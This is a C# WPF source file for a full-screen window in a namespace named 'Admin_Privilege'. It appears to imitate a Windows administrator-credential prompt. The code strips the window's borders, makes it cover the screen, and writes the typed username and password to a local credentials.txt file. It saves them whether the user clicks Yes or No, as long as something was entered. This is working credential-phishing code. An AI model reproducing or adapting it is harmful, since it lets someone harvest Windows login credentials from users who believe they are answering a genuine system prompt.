using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Windows;
using System.Windows.Input;
using System.Windows.Interop;

namespace Admin_Privilege
{
    public partial class MainWindow : Window
    {
        [DllImport("user32.dll")]
        private static extern IntPtr GetForegroundWindow();

        [DllImport("user32.dll")]
        private static extern uint GetWindowLong(IntPtr hWnd, int nIndex);

        [DllImport("user32.dll")]
        private static extern uint SetWindowLong(IntPtr hWnd, int nIndex, uint dwNewLong);

        private const int GWL_STYLE = -16;
        private const uint WS_CAPTION = 0x00C00000;
        private const uint WS_POPUP = 0x80000000;

        public MainWindow()
        {
            InitializeComponent();
            Loaded += MainWindow_Loaded;
        }

        private void MainWindow_Loaded(object sender, RoutedEventArgs e)
        {
            SetFullScreen();
        }

        private void SetFullScreen()
        {
            var windowHelper = new WindowInteropHelper(this);
            IntPtr hWnd = windowHelper.Handle;

            // Cambiar el estilo de la ventana para ocultar la barra de título y bordes
            uint style = GetWindowLong(hWnd, GWL_STYLE);
            SetWindowLong(hWnd, GWL_STYLE, (style & ~WS_CAPTION) | WS_POPUP);

            // Configurar la ventana para ocupar toda la pantalla
            this.WindowStyle = WindowStyle.None;
            this.ResizeMode = ResizeMode.NoResize;
            this.WindowState = WindowState.Maximized;
            this.Top = 0;
            this.Left = 0;
            this.Width = SystemParameters.PrimaryScreenWidth;
            this.Height = SystemParameters.PrimaryScreenHeight;
        }

        private void SaveDataToFile()
        {
            string path = @".\credentials.txt";

            if (!File.Exists(path))
            {
                using (StreamWriter sw = File.CreateText(path))
                {
                    sw.WriteLine("LOGIN:PASSWORD");
                }
            }

            using (StreamWriter sw = File.AppendText(path))
            {
                sw.WriteLine(Username.Text + ":" + Password.Password);
            }
        }

        private void TitleBar_MouseDown(object sender, MouseButtonEventArgs e)
        {
            if (e.ChangedButton == MouseButton.Left)
            {
                DragMove();
            }
        }

        private void CloseButton_Click(object sender, RoutedEventArgs e)
        {
            Close();
        }

        private void YesButton_Click(object sender, RoutedEventArgs e)
        {
            SaveDataToFile();
            Close();
        }

        private void NoButton_Click(object sender, RoutedEventArgs e)
        {
            if (Username.Text.Length > 0 || Password.Password.Length > 0)
            {
                SaveDataToFile();
            }
            Close();
        }
    }
}
